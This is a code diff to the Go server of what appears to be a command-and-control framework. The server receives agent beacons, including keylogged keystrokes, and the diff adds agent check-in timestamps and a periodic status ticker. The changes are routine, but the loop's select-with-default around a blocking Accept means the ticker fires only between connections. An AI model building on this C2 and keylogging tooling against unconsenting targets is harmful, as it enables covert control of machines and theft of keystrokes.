@@ -8,6 +8,7 @@ import (
 	"net"
 	"os"
 	"strings"
+	"time"
 
 	"github.com/PatronC2/Patron/data"
 	"github.com/PatronC2/Patron/types"
@@ -94,6 +95,8 @@ func handleconn(connection net.Conn) {
 								}
 								connection.Close()
 							}
+							now := time.Now()
+							data.UpdateAgentCheckIn(uid, now.Unix())
 						} else if keyOrNot == "KeysBeacon" { // Handle keylog response
 
 							logger.Logf(logger.Info, "Agent %s Keys Beacon Connected\n", uid)
@@ -115,6 +118,8 @@ func handleconn(connection net.Conn) {
 								logger.Logf(logger.Debug, "Agent %s Sent Back No Keys\n", uid)
 								connection.Close()
 							}
+							now := time.Now()
+							data.UpdateAgentCheckIn(uid, now.Unix())
 						} else {
 							logger.Logf(logger.Info, "Unknown Beacon Type\n")
 							connection.Close()
@@ -156,15 +161,22 @@ func main() {
 	if err != nil {
 		log.Fatalln(err)
 	}
+	// Update Agent status ricker
+	ticker := time.Tick(5 * time.Second)
 
 	defer listener.Close()
 	for {
-		connection, err := listener.Accept()
-		if err != nil {
-			log.
-				Fatalln(err)
+		select {
+		case <-ticker:
+			go data.UpdateAgentStatus()
+		default:
+			connection, err := listener.Accept()
+			if err != nil {
+				log.
+					Fatalln(err)
+			}
+			go handleconn(connection)
 		}
-		go handleconn(connection)
 
 	}
 }
